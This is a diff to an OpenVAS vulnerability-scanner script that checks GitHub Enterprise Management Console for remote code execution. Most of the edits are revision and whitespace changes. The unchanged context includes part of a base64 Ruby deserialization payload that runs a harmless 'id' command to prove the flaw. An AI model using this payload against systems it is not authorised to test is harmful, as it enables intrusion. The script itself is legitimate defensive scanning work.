@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_github_enterprise_management_console_rce_03_17.nasl 9121 2018-03-17 13:28:53Z cfischer $
+# $Id: gb_github_enterprise_management_console_rce_03_17.nasl 11863 2018-10-12 09:42:02Z mmartin $
 #
 # Remote code execution in GitHub Enterprise Management Console
 #
@@ -29,8 +29,8 @@ CPE = 'cpe:/a:github:github_enterprise';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140196");
-  script_version("$Revision: 9121 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-03-17 14:28:53 +0100 (Sat, 17 Mar 2018) $");
+  script_version("$Revision: 11863 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-12 11:42:02 +0200 (Fri, 12 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-03-17 17:11:03 +0100 (Fri, 17 Mar 2017)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -39,7 +39,7 @@ if(description)
   script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("gb_github_enterprise_web_detect.nasl");
-  script_require_ports("Services/www", 8443, 8080 );
+  script_require_ports("Services/www", 8443, 8080);
   script_mandatory_keys("github/enterprise/webmanagement/detected");
 
   script_xref(name:"URL", value:"https://packetstormsecurity.com/files/141653/GitHub-Enterprise-2.8.x-Remote-Code-Execution.html");
@@ -129,7 +129,7 @@ hash = hexstr( HMAC_SHA1( data:data, key:SECRET ) );
 if( hash != hmac ) exit( 99 );
 
 # id > ./public/openvas_1808149858
-dump = 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiAAY7AFRJIgxleHBsb2l0BjsAVG86' + 
+dump = 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiAAY7AFRJIgxleHBsb2l0BjsAVG86' +
        'QEFjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uOjpEZXByZWNhdGVkSW5zdGFu' +
        'Y2VWYXJpYWJsZVByb3h5CDoOQGluc3RhbmNlbzoSRXJ1YmlzOjpFcnVieQY6' +
        'CUBzcmNJIiwleHtpZCA+IC4vcHVibGljL29wZW52YXNfMTgwODE0OTg1OH07' +
